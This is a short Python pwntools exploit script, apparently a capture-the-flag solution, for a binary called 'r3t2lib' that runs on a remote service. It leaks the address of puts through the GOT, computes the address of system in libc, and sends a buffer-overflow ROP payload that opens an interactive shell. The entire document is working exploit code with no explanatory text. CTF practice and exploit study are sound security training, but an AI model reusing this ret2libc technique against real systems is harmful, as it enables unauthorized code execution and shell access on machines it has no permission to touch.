#!/usr/bin/env python
from pwn import *

elf = ELF('r3t2lib')
libc = elf.libc

puts_got = elf.got['puts']
puts_offset = libc.sym['puts'] # 0x6f690
system_offset = libc.sym['system'] # 0x45390
bin_sh = 0x6003c4   # 'sh'

context(arch = "amd64", os = "linux", bits = 64)
DEBUG = False
# DEBUG = True

if DEBUG:
    p = process("r3t2lib")
else:
    p = remote("pwnhub.tw", 8088)

padding = "A" * 280

p.recvuntil(":")
p.sendline(hex(puts_got)[2:])
# p.sendline("601018")
p.recvuntil(": ")

puts_addr = int(p.recvline().strip(), 16)
system_addr = puts_addr - puts_offset + system_offset
pop_rdi = 0x400843

payload = padding + p64(pop_rdi) + p64(bin_sh) + p64(system_addr)
# raw_input()
p.sendline(payload)
p.recvuntil(":")

p.interactive()
p.close()
